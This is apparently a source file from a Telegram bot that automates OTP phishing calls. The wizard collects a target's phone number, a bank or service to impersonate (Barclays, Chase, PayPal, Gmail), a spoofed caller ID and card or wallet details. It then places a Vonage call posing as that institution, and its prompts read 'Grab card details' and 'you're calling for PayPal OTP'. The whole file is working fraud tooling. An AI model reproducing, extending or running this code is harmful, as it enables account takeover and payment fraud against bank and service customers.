"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.steps = void 0;
const telegraf_1 = require("telegraf");
const server_1 = require("../server");
const constants_1 = require("./constants");
const vonage_1 = require("./vonage");
const steps = (step) => [
    (ctx) => __awaiter(void 0, void 0, void 0, function* () {
        yield ctx.replyWithHTML(`👍🏽 Awesome, Let's start\n\nReply with the number 📱\n(ex. ${Math.round(Math.random()) ? constants_1.UK_NUM : constants_1.US_NUM})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`);
        ctx.wizard.state.callData = {};
        return ctx.wizard.next();
    }),
    (ctx) => __awaiter(void 0, void 0, void 0, function* () {
        var _a;
        if (!ctx.message) {
            yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
            return ctx.scene.leave();
        }
        yield ctx.replyWithHTML(`Good,\n\nReply with the ${step === 'account' ? 'institution name 🏢' : 'bank name 🏦'}\n(e.g ${/^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(ctx.message.text)
            ? `${step === 'account' ? 'Gmail' : 'Barclays'}`
            : `${step === 'account' ? 'Paypal' : 'Chase'}`})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
        ctx.wizard.state.userCalling = {
            [ctx.message.text]: (_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id,
        };
        ctx.wizard.state.callData.number = ctx.message.text;
        return ctx.wizard.next();
    }),
    (ctx) => __awaiter(void 0, void 0, void 0, function* () {
        yield ctx.replyWithHTML(`Okay,\n\nReply with the caller ID 👤\n(e.g ${/^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(ctx.wizard.state.callData.number)
            ? '448081961740'
            : '18882019292'})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b></b>`);
        ctx.wizard.state.callData.institutionName = ctx.message.text;
        return ctx.wizard.next();
    }),
    ...(step === 'pay'
        ? [
            (ctx) => __awaiter(void 0, void 0, void 0, function* () {
                const numValid = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(ctx.message.text);
                if (!numValid) {
                    yield ctx.reply(`Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `);
                    return;
                }
                yield ctx.replyWithHTML(`Perfect, Reply with the wallet service name \n(e.g ${Math.round(Math.random()) ? 'Apple pay' : 'Google pay'})\n\n<i>***request will expire in 2 minutes***</i><b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`);
                ctx.wizard.state.callData.callerId = ctx.message.text;
                return ctx.wizard.next();
            }),
        ]
        : []),
    ...(step === 'card'
        ? [
            (ctx) => __awaiter(void 0, void 0, void 0, function* () {
                const numValid = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(ctx.message.text);
                if (!numValid) {
                    yield ctx.reply(`Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `);
                    return;
                }
                yield ctx.replyWithHTML(`💳 Select card type\n\n<i>***request will expire in 2 minutes***</i><b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('Debit', 'debit'),
                    telegraf_1.Markup.button.callback('Credit', 'credit'),
                ]));
                ctx.wizard.state.callData.callerId = ctx.message.text;
                return ctx.wizard.next();
            }),
        ]
        : []),
    ...(step === 'account'
        ? [
            (ctx) => __awaiter(void 0, void 0, void 0, function* () {
                const numValid = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(ctx.message.text);
                if (!numValid) {
                    yield ctx.reply(`Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `);
                    return;
                }
                yield ctx.replyWithHTML("Grab card 💳 details\n\n<b>***Only click on yes if it's relevant***</b>\n\ne.g you're calling for PayPal OTP, you wouldn't ask card details for a Gmail OTP 🙄", telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('Yes', 'yes'),
                    telegraf_1.Markup.button.callback('No', 'no'),
                ]));
                ctx.wizard.state.callData.callerId = ctx.message.text;
                return ctx.wizard.next();
            }),
            (ctx) => __awaiter(void 0, void 0, void 0, function* () {
                yield ctx.replyWithHTML(`Click call once you have sent the OTP.\n\n<i>***request will expire in 2 minutes***</i><b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Call now', 'call')]));
                return ctx.wizard.next();
            }),
        ]
        : []),
    (ctx) => __awaiter(void 0, void 0, void 0, function* () {
        if (!ctx.wizard.state.callData) {
            yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback("🎬 Let's go", 'start')]));
        }
        if (step === 'bank' && !ctx.wizard.state.callData.callerId) {
            const numValid = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(ctx.message.text);
            if (!numValid) {
                yield ctx.reply(`Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `);
                return;
            }
            ctx.wizard.state.callData.callerId = ctx.message.text;
        }
        ctx.wizard.state.callData.wallet = ctx.message
            ?
                ctx.message.text
            : undefined;
        const { number, institutionName, callerId, wallet, cardType, askCardInfo, } = ctx.wizard.state.callData;
        const from = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(number)
            ? process.env.UK_NUM
            : process.env.US_NUM;
        yield ctx.replyWithHTML(`Calling ${number}\nfrom ${callerId} as:\n\n${institutionName} 📲...
          \n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`);
        yield server_1.server(ctx);
        yield vonage_1.vonageMakeACall({
            from,
            to: number,
            institutionName: institutionName,
            step,
            wallet,
            cardType,
            askCardInfo,
        });
    }),
];
exports.steps = steps;
